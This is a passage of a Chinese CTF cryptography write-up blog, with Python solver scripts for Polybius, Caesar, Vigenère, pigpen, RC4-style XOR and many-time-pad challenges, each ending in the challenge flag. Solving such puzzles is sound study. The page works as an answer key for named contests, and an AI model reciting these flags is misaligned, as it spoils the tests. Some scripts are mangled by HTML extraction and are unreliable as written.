class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    headlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    x <span class="token operator">=</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        headlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> headlist<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> j        dic<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span>    <span class="token keyword">return</span> dic<span class="token keyword">def</span> <span class="token function">PolybiusSolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 创建方阵</span>    polybius<span class="token punctuation">(</span><span class="token punctuation">)</span>    dic <span class="token operator">=</span> listall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        plaintext <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            plaintext <span class="token operator">+=</span> polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">[</span>ciphertext<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span>ciphertext<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>PolybiusSolve<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flagi\jspolybi\jus</span><span class="token comment"># flagispolybius</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有将i和j单独分开是因为会造成很多麻烦，所以这里要根据”语境”对是’i’或’j’来进行研判。</p><h3 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h3><h4 id="BJDCTF2020-编码与调制"><a href="#BJDCTF2020-编码与调制" class="headerlink" title="[BJDCTF2020]编码与调制"></a>[BJDCTF2020]编码与调制</h4><p><strong>TAG: 曼彻斯特编码</strong></p><p><img src="/2021/05/28/CTF/image-20210727124821706.png" alt></p><p>使用下载的软件解，按步骤进行即可，最后解码得出的十六进制为</p><pre class="line-numbers language-none"><code class="language-none">024A447B4469664D616E63686573746572636F64657D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210727125204272.png" alt></p><p>再在线解一下即得flag</p><h3 id="复杂古典密码"><a href="#复杂古典密码" class="headerlink" title="复杂古典密码"></a>复杂古典密码</h3><blockquote><p>所谓复杂，也不过就是多了几层套娃而已，近年来的套娃与爆破之风愈演愈烈，固而有此分类。</p></blockquote><h4 id="UTCTF2020-basic-crypto"><a href="#UTCTF2020-basic-crypto" class="headerlink" title="[UTCTF2020]basic-crypto"></a>[UTCTF2020]basic-crypto</h4><p>写个简单脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64t <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token triple-quoted-string stringspan><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plaintext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>kaisa <span class="token operator">=</span> <span class="token string">"kvbsqrd, iye'bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S'fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq&#123;...&#125; - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd 'o' crygc ez wycd ypdox sx dro kvzrklod, cy drkd'c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li 'd', kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo."</span>cipin <span class="token operator">=</span> <span class="token string">"rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn&#123;h0v_di4du_vi4d_t_r4yy_rxqld0&#125;. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> kaisa<span class="token punctuation">:</span>        tmp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">] '</span></span> <span class="token operator">+</span> tmp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转十进制，转char，转base64，最后看出来flag那部分是词频分析，直接在线quipquip解得</p><p><img src="/2021/05/28/CTF/image-20210726210941538.png" alt></p><p><code>flag&#123;n0w_th4ts_wh4t_i_c4ll_crypt0&#125;</code></p><h4 id="ACTF新生赛2020-crypto-classic1"><a href="#ACTF新生赛2020-crypto-classic1" class="headerlink" title="[ACTF新生赛2020]crypto-classic1"></a>[ACTF新生赛2020]crypto-classic1</h4><p><strong>TAG: 键盘密码， 维吉尼亚</strong></p><p>先是键盘密码</p><pre class="line-numbers language-none"><code class="language-none">哇，这里有压缩包的密码哦，于是我低下了头，看向了我的双手，试图从中找到某些规律xdfv ujko98 edft54 xdfv pok,.; wsdr43circle<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得压缩包内容为</p><pre class="line-numbers language-none"><code class="language-none">SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;解维吉尼亚得.密钥为sp我没解出来，看大哥写的脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>大哥写的脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#破解key</span>s<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span> s1<span class="token operator">=</span><span class="token string">'ACTF'</span> s2<span class="token operator">=</span><span class="token string">'SRLU'</span> key <span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     key<span class="token operator">+=</span>s<span class="token punctuation">[</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>s<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token keyword">print</span> key  <span class="token comment">#解密</span>cipher <span class="token operator">=</span> <span class="token string">'SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;'</span>key <span class="token operator">=</span> <span class="token string">'SP'</span><span class="token comment">#decode</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> table<span class="token punctuation">[</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>find<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">-</span>table<span class="token punctuation">.</span>find<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token keyword">print</span> flag<span class="token comment">#ACTFHWHATKAKCLASSICALKVIGENEREH</span> <span class="token triple-quoted-string string">'''cipher = SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;ACTF&#123;WHAT_A_CLASSICAL_VIGENERE&#125;flag&#123;what_a_classical_vigenere&#125;'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NPUCTF2020-Classical-Cipher"><a href="#NPUCTF2020-Classical-Cipher" class="headerlink" title="[NPUCTF2020]Classical Cipher"></a>[NPUCTF2020]Classical Cipher</h4><p><strong>TAG: 词频分析、符号密码</strong></p><p><img src="/2021/05/28/CTF/image-20210727142612399.png" alt></p><p>找出来key，然后获得一张图片，猪圈密码看得出来，那个动物的那个不知道是什么加密了，猜猜就好了。</p><p><img src="/2021/05/28/CTF/image-20210727142847265.png" alt></p><p><img src="/2021/05/28/CTF/image-20210727143845598.png" alt="变形猪圈"></p><p><img src="/2021/05/28/CTF/image-20210727145244333.png" alt="符号解密"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;classicalcode&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="普通异或加密"><a href="#普通异或加密" class="headerlink" title="普通异或加密"></a>普通异或加密</h3><h4 id="EasyProgram"><a href="#EasyProgram" class="headerlink" title="EasyProgram"></a>EasyProgram</h4><pre class="line-numbers language-none"><code class="language-none">get buf unsign s[256]get buf t[256]we have key:whoamiwe have flag:????????????????????????????????for i:0 to 256    set s[i]:ifor i:0 to 256    set t[i]:key[(i)mod(key.lenth)]for i:0 to 256    set j:(j+s[i]+t[i])mod(256)        swap:s[i],s[j]for m:0 to 38    set i:(i + 1)mod(256)    set j:(j + S[i])mod(256)    swap:s[i],s[j]    set x:(s[i] + (s[j]mod(256))mod(256))    set flag[m]:flag[m]^s[x]fprint flagx to file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析一下上面的伪代码<code>set flag[m]:flag[m]^s[x]</code>，只有这一句有flag参与了运算，根据异或运算的可逆性，这里我们只需要获得<code>s[x]</code>就能进而获得flag的内容了。写出逆代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binasciis <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token string">'whoami'</span>flag <span class="token operator">=</span> <span class="token string">''</span>ciphertext <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>        ciphertext<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>i <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    x <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;f238yu28323uf28u2yef2ud8uf289euf&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一次一密"><a href="#一次一密" class="headerlink" title="一次一密"></a>一次一密</h3><blockquote><p>题目类型应该以buu上的<code>你听说过一次一密么？</code>这道题目开始的，此类题目有一种共同的解法，因此将其分为一类。英文名应该是叫做<code>many-time-pad-attack</code>这种攻击。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><span class="token comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><span class="token keyword">import</span> string<span class="token keyword">import</span> collections<span class="token keyword">import</span> sets<span class="token punctuation">,</span> sys<span class="token comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span>c1 <span class="token operator">=</span> <span class="token string">'25030206463d3d393131555f7f1d061d4052111a19544e2e5d'</span>c2 <span class="token operator">=</span> <span class="token string">'0f020606150f203f307f5c0a7f24070747130e16545000035d'</span>c3 <span class="token operator">=</span> <span class="token string">'1203075429152a7020365c167f390f1013170b1006481e1314'</span>c4 <span class="token operator">=</span> <span class="token string">'0f4610170e1e2235787f7853372c0f065752111b15454e0e09'</span>c5 <span class="token operator">=</span> <span class="token string">'081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'</span>c6 <span class="token operator">=</span> <span class="token string">'0909075412132e247436425332281a1c561f04071d520f0b11'</span>c7 <span class="token operator">=</span> <span class="token string">'4116111b101e2170203011113a69001b475206011552050219'</span>c8 <span class="token operator">=</span> <span class="token string">'041006064612297020375453342c17545a01451811411a470e'</span>c9 <span class="token operator">=</span> <span class="token string">'021311114a5b0335207f7c167f22001b44520c15544801125d'</span>c10 <span class="token operator">=</span> <span class="token string">'06140611460c26243c7f5c167f3d015446010053005907145d'</span>c11 <span class="token operator">=</span> <span class="token string">'0f05110d160f263f3a7f4210372c03111313090415481d49'</span>ciphers <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">,</span> c5<span class="token punctuation">,</span> c6<span class="token punctuation">,</span> c7<span class="token punctuation">,</span> c8<span class="token punctuation">,</span> c9<span class="token punctuation">,</span> c10<span class="token punctuation">,</span> c11<span class="token punctuation">]</span><span class="token comment"># The target ciphertext we want to crack</span><span class="token comment"># target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"</span><span class="token comment"># XORs two string</span><span class="token keyword">def</span> <span class="token function">strxor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># xor two strings (trims the longer input)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">target_fix</span><span class="token punctuation">(</span>target_cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># To store the final key</span>    final_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">150</span>    <span class="token comment"># To store the positions we know are broken</span>    known_key_positions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># For each ciphertext</span>    <span class="token keyword">for</span> current_index<span class="token punctuation">,</span> ciphertext <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>        counter <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># for each other ciphertext</span>        <span class="token keyword">for</span> index<span class="token punctuation">,</span> ciphertext2 <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> current_index <span class="token operator">!=</span> index<span class="token punctuation">:</span>  <span class="token comment"># don't xor a ciphertext with itself</span>                <span class="token keyword">for</span> indexOfChar<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>                        strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ciphertext2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Xor the two ciphertexts</span>                    <span class="token comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span>                    <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable <span class="token keyword">and</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> counter<span class="token punctuation">[</span>                        indexOfChar<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># Increment the counter at this index</span>        knownSpaceIndexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># Loop through all positions where a space character was possible in the current_index cipher</span>        <span class="token keyword">for</span> ind<span class="token punctuation">,</span> val <span class="token keyword">in</span> counter<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span>            <span class="token keyword">if</span> val <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span> knownSpaceIndexes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ind<span class="token punctuation">)</span>        <span class="token comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span>        <span class="token comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span>        xor_with_spaces <span class="token operator">=</span> strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">150</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> knownSpaceIndexes<span class="token punctuation">:</span>            <span class="token comment"># Store the key's value at the correct position</span>            final_key<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> xor_with_spaces<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>            <span class="token comment"># Record that we known the key at this position</span>            known_key_positions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>index<span class="token punctuation">)</span>    <span class="token comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span>    final_key_hex <span 